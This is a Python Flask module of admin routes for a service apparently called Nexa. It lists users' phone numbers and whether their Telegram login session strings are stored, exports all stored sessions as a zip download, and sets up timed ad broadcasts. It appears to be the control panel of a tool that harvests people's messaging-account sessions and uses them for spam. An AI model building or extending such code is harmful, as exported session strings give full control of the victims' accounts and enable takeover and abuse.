"""Admin panel API routes."""
import uuid
from functools import wraps

from flask import Blueprint, jsonify, request, session, render_template, redirect, url_for

from config import ADMIN_PASSWORD
from Nexa.session_manager import session_manager, build_sessions_zip
from Nexa.session_tools import check_many
import Nexa.database as dbmod

admin_bp = Blueprint("admin", __name__)


def admin_required(fn):
    @wraps(fn)
    def wrapper(*args, **kwargs):
        if not session.get("admin"):
            if request.path.startswith("/admin/api/"):
                return jsonify({"success": False, "error": "unauthorized"}), 401
            return redirect(url_for("admin.admin_login_page"))
        return fn(*args, **kwargs)
    return wrapper


@admin_bp.route("/login")
def admin_login_page():
    return render_template("admin_login.html")


@admin_bp.route("/")
@admin_required
def admin_home():
    return render_template("admin.html")


@admin_bp.route("/api/login", methods=["POST"])
def admin_login():
    data = request.get_json(silent=True) or {}
    password = (data.get("password") or "").strip()
    expected = (ADMIN_PASSWORD or "").strip()
    if not expected:
        return jsonify({"success": False, "error": "ADMIN_PASSWORD not configured"}), 500
    if password != expected:
        return jsonify({"success": False, "error": "wrong password"}), 403
    session["admin"] = True
    session["csrf"] = uuid.uuid4().hex
    return jsonify({"success": True, "ok": True})


@admin_bp.route("/api/logout", methods=["POST"])
def admin_logout():
    session.pop("admin", None)
    return jsonify({"success": True})


@admin_bp.route("/api/stats")
@admin_required
def admin_stats():
    dbmod.ensure_db()
    stats = {
        "users": dbmod.count_users(),
        "active_sessions": session_manager.get_active_count(),
        "ads": dbmod.get_ads_config(),
    }
    return jsonify({"success": True, "stats": stats})


@admin_bp.route("/api/users")
@admin_required
def admin_users():
    rows = dbmod.list_users(300)
    out = []
    for u in rows:
        out.append({
            "phone": u.get("phone"),
            "user_id": u.get("user_id"),
            "username": u.get("username"),
            "status": u.get("status"),
            "has_session": bool(u.get("session_string")),
            "has_telethon": bool(u.get("telethon_string")),
            "created_at": str(u.get("created_at") or ""),
        })
    return jsonify({"success": True, "users": out})


@admin_bp.route("/api/sessions/cleanup", methods=["POST"])
@admin_required
def cleanup_sessions():
    dead = session_manager.cleanup_dead_sessions()
    try:
        session_manager.enforce_auto_logout()
    except Exception:
        pass
    return jsonify({"success": True, "dead": dead})


@admin_bp.route("/api/sessions/download", methods=["GET"])
@admin_required
def download_sessions():
    from flask import send_file
    pending = session_manager.list_sessions()
    users = dbmod.users_with_sessions(500)
    buf, name = build_sessions_zip(pending, users)
    return send_file(buf, as_attachment=True, download_name=name, mimetype="application/zip")


@admin_bp.route("/api/ads", methods=["GET", "POST"])
@admin_required
def ads_config():
    if request.method == "GET":
        return jsonify({"success": True, "config": dbmod.get_ads_config()})
    data = request.get_json(silent=True) or {}
    cfg = dbmod.get_ads_config()
    cfg.update({k: data[k] for k in ("ads_enabled", "interval", "message", "media_url") if k in data})
    dbmod.set_ads_config(cfg)
    return jsonify({"success": True, "config": cfg})
